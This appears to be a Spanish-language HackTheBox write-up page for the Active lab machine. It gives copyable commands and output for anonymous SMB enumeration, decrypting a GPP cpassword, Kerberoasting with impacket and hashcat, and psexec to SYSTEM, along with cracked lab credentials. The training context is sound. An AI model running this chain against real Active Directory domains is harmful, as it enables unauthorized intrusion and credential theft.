@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Active — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Active de HackTheBox (Windows / Active Directory, Fácil): un cpassword de GPP en SYSVOL (MS14-025) da credenciales de SVC_TGS, el Kerberoasting rompe la contraseña de Administrator y psexec entrega SYSTEM en el controlador de dominio.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/facil/active.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Active — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Active de HackTheBox (Windows / Active Directory, Fácil): un cpassword de GPP en SYSVOL (MS14-025) da credenciales de SVC_TGS, el Kerberoasting rompe la contraseña de Administrator y psexec entrega SYSTEM en el controlador de dominio.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/facil/active.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/active.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Active — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Active de HackTheBox (Windows / Active Directory, Fácil): un cpassword de GPP en SYSVOL (MS14-025) da credenciales de SVC_TGS, el Kerberoasting rompe la contraseña de Administrator y psexec entrega SYSTEM en el controlador de dominio.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/active.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Active — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Active de HackTheBox (Windows / Active Directory, Fácil): un cpassword de GPP en SYSVOL (MS14-025) da credenciales de SVC_TGS, el Kerberoasting rompe la contraseña de Administrator y psexec entrega SYSTEM en el controlador de dominio.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/active.html", "image": "https://brandeiks.github.io/assets/og/active.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/facil/active.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>active</span>
+    </div>
+    <h1 class="writeup-title">AC<span>TIVE</span></h1>
+    <p class="writeup-subtitle">// GPP cpassword en SYSVOL → Kerberoasting a Administrator → SYSTEM</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-windows">ACTIVE DIRECTORY</span>
+      <span class="meta-badge badge-cve">MS14-025</span>
+      <span class="meta-badge badge-shell">KERBEROASTING</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento del DC</a></li>
+        <li><a href="#gpp">02 · GPP cpassword en SYSVOL</a></li>
+        <li><a href="#kerberoast">03 · Kerberoasting y SYSTEM</a></li>
+        <li><a href="#cmdref">04 · Referencia Comandos</a></li>
+        <li><a href="#glosario">05 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Active</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Windows Server (DC)</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-green">Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">DOMINIO</span><span class="info-val val-yellow">active.htb</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">MS14-025</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SMB anónimo → <span>Replication</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Groups.xml → <span>cpassword</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SVC_TGS</span> (dominio)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Kerberoasting → <span>Administrator</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">psexec → <span>SYSTEM</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECONOCIMIENTO DEL DC ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento del DC</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">RESOLVER EL DOMINIO Y ESCANEAR</span>
+      </div>
+      <div class="cmd-block" data-cmd="echo '10.129.5.206 active.htb active' | sudo tee -a /etc/hosts; sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.5.206">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">echo <span class="arg">'10.129.5.206 active.htb active'</span> | sudo tee <span class="flag">-a</span> <span class="arg">/etc/hosts</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -n -Pn -sS --min-rate</span> <span class="arg">3000</span> <span class="flag">--max-retries</span> <span class="arg">1</span> <span class="arg">10.129.5.206</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>53/tcp    open  domain       Microsoft DNS</div>
+        <div><span class="o-green">88/tcp    open  kerberos-sec</span></div>
+        <div>135,139,445/tcp open  msrpc/netbios/microsoft-ds</div>
+        <div><span class="o-green">389,636/tcp open  ldap/ldapssl</span></div>
+        <div><span class="o-green">3268,3269/tcp open  globalcatLDAP</span></div>
+        <div>5722,9389,47001/tcp open  msdfsr/adws/winrm</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          Este conjunto de puertos (53, 88, 389, 3268...) es la huella inconfundible de un
+          <strong>controlador de dominio</strong> de Active Directory. En un DC, el primer reflejo es probar el acceso
+          SMB/LDAP <strong>anónimo</strong>.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 GPP CPASSWORD EN SYSVOL ===================== -->
+    <div class="section" id="gpp">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">GPP cpassword en SYSVOL</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">LISTAR SHARES ANÓNIMOS</span>
+      </div>
+      <div class="cmd-block" data-cmd="smbclient -N -L //active.htb/; smbclient -N //active.htb/Replication -c 'recurse ON; ls'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SMBCLIENT</span>
+        <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="flag">-N -L</span> <span class="arg">//active.htb/</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="flag">-N</span> <span class="arg">//active.htb/Replication</span> <span class="flag">-c</span> <span class="arg">'recurse ON; ls'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">Replication  Disk</span></div>
+        <div>SYSVOL       Disk</div>
+        <div>Users        Disk</div>
+        <div>NETLOGON     Disk</div>
+        <div></div>
+        <div>active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\<span class="o-yellow">Groups.xml</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">DESCARGAR Y DESCIFRAR EL CPASSWORD</span>
+      </div>
+      <div class="cmd-block" data-cmd="smbclient -N //active.htb/Replication -c &quot;get active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml /tmp/Groups.xml&quot;; grep -oE 'cpassword=&quot;[^&quot;]*&quot;' /tmp/Groups.xml; gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">GPP-DECRYPT</span>
+        <div><span class="prompt">$ </span><span class="cmd">grep <span class="flag">-oE</span> <span class="arg">'cpassword="[^"]*"'</span> <span class="arg">/tmp/Groups.xml</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">gpp-decrypt <span class="arg">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>userName="active.htb\SVC_TGS"</div>
+        <div><span class="o-green">GPPstillStandingStrong2k18</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// MS14-025: GPP CPASSWORD</p>
+        <p>
+          <strong>Dónde:</strong> <code>Groups.xml</code> dentro del SYSVOL replicado, legible por cualquiera con acceso
+          anónimo a <code>Replication</code>.<br>
+          <strong>Qué permite:</strong> las Group Policy Preferences cifraban contraseñas con AES — pero Microsoft
+          <strong>publicó la clave</strong> en su documentación. <code>gpp-decrypt</code> revierte el cifrado al
+          instante: credenciales <strong>SVC_TGS:GPPstillStandingStrong2k18</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">FLAG DE USUARIO</span>
+      </div>
+      <div class="cmd-block" data-cmd="smbclient //active.htb/Users -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18' -c 'get SVC_TGS/Desktop/user.txt /tmp/ac_user.txt'; cat /tmp/ac_user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SMBCLIENT</span>
+        <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="arg">//active.htb/Users</span> <span class="flag">-U</span> <span class="arg">'active.htb/SVC_TGS%GPPstillStandingStrong2k18'</span> <span class="flag">-c</span> <span class="arg">'get SVC_TGS/Desktop/user.txt /tmp/ac_user.txt'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">[flag oculta]</span></div>
+      </div>
+    </div>
+
+    <!-- ===================== 03 KERBEROASTING Y SYSTEM ===================== -->
+    <div class="section" id="kerberoast">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Kerberoasting y SYSTEM</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">PEDIR LOS TGS DE CUENTAS CON SPN</span>
+      </div>
+      <div class="cmd-block" data-cmd="impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.5.206 -request; hashcat -m 13100 -a 0 /tmp/ac_hash.txt /usr/share/wordlists/rockyou.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">KERBEROASTING</span>
+        <div><span class="prompt">$ </span><span class="cmd">impacket-GetUserSPNs <span class="arg">'active.htb/SVC_TGS:GPPstillStandingStrong2k18'</span> <span class="flag">-dc-ip</span> <span class="arg">10.129.5.206</span> <span class="flag">-request</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="arg">13100</span> <span class="flag">-a</span> <span class="arg">0</span> <span class="arg">/tmp/ac_hash.txt /usr/share/wordlists/rockyou.txt</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>ServicePrincipalName   Name</div>
+        <div><span class="o-yellow">active/CIFS:445        Administrator</span></div>
+        <div></div>
+        <div>$krb5tgs$23$...:<span class="o-green">Ticketmaster1968</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// KERBEROASTING</p>
+        <p>
+          <strong>Dónde:</strong> cualquier usuario autenticado del dominio puede pedir un ticket TGS para
+          <strong>cualquier cuenta con SPN</strong>.<br>
+          <strong>Qué permite:</strong> el ticket va cifrado con el hash NTLM de la contraseña de esa cuenta; si es
+          débil, se rompe <strong>offline</strong> por diccionario. Aquí el SPN <code>active/CIFS:445</code> pertenece
+          nada menos que a <strong>Administrator</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">SYSTEM CON PSEXEC</span>
+      </div>
+      <div class="cmd-block" data-cmd="impacket-psexec 'active.htb/Administrator:Ticketmaster1968@active.htb' 'cmd /c whoami & type C:\Users\Administrator\Desktop\root.txt'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">PSEXEC</span>
+        <div><span class="prompt">$ </span><span class="cmd">impacket-psexec <span class="arg">'active.htb/Administrator:Ticketmaster1968@active.htb'</span> \</span></div>
+        <div><span class="cmd">  <span class="arg">'cmd /c whoami & type C:\Users\Administrator\Desktop\root.txt'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">nt authority\system</span></div>
+        <div><span class="o-green">[flag oculta]</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAGS</p>
+        <p>
+          <strong>user:</strong> [flag oculta] · <strong>root:</strong> [flag oculta].
+          Ruta completa: SMB anónimo → <code>Replication</code> → GPP <code>cpassword</code> → SVC_TGS → Kerberoasting
+          → Administrator → <code>psexec</code> → SYSTEM.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">smbclient -N</div>
+          <div class="cmd-ref-syntax">smbclient -N -L //dominio/ ; smbclient -N //dominio/share -c 'recurse ON; ls'</div>
+          <div class="cmd-ref-desc">Lista y navega recursos SMB con login anónimo (null session).</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">gpp-decrypt</div>
+          <div class="cmd-ref-syntax">gpp-decrypt '&lt;cpassword&gt;'</div>
+          <div class="cmd-ref-desc">Descifra el campo cpassword de las Group Policy Preferences usando la clave AES que Microsoft publicó (MS14-025).</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">impacket-GetUserSPNs</div>
+          <div class="cmd-ref-syntax">impacket-GetUserSPNs 'dominio/usuario:pass' -dc-ip IP -request</div>
+          <div class="cmd-ref-desc">Enumera cuentas con SPN y pide sus tickets TGS (Kerberoasting), listos para crackear offline.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">hashcat -m 13100</div>
+          <div class="cmd-ref-syntax">hashcat -m 13100 -a 0 hash.txt lista.txt</div>
+          <div class="cmd-ref-desc">Modo de hashcat específico para tickets Kerberos TGS-REP (krb5tgs), el formato que genera el Kerberoasting.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">impacket-psexec</div>
+          <div class="cmd-ref-syntax">impacket-psexec 'dominio/usuario:pass@host' 'comando'</div>
+          <div class="cmd-ref-desc">Ejecuta un comando remoto como SYSTEM vía SMB, usando credenciales administrativas válidas.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 05 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SYSVOL / Replication</div>
+          <div class="glos-def">
+            Carpeta compartida de un controlador de dominio con políticas y scripts de inicio de sesión, replicada
+            entre DCs. Suele ser legible por cualquier usuario autenticado, a veces incluso anónimo.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GPP cpassword (MS14-025)</div>
+          <div class="glos-def">
+            Las Group Policy Preferences antiguas guardaban contraseñas cifradas con AES en <code>Groups.xml</code>, pero
+            Microsoft publicó la clave de cifrado por error de diseño: el campo se descifra trivialmente.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SPN — Service Principal Name</div>
+          <div class="glos-def">
+            Identificador que vincula una cuenta de AD con un servicio de red (por ejemplo <code>CIFS</code>). Cualquier
+            cuenta con un SPN es un objetivo potencial de Kerberoasting.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Kerberoasting</div>
+          <div class="glos-def">
+            Técnica que pide tickets TGS de cuentas con SPN (sin necesitar privilegios) y los crackea offline, porque
+            van cifrados con el hash NTLM de la contraseña de esa cuenta.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">psexec (impacket)</div>
+          <div class="glos-def">
+            Reimplementación del PsExec clásico: despliega un servicio temporal vía SMB y ejecuta comandos con los
+            privilegios de la cuenta usada, típicamente SYSTEM si es administradora.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="devel.html"><span class="dir">← ANTERIOR</span><span class="nombre">Devel</span></a><a class="siguiente" href="arctic.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Arctic</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="arctic.html"><span class="nombre">Arctic</span><span class="meta">hackthebox · facil · Windows · CVE</span></a><a class="rel-card" href="devel.html"><span class="nombre">Devel</span><span class="meta">hackthebox · facil · Windows</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Active · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "ACTIVE", "plataforma": "hackthebox", "dificultad": "facil", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/active.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
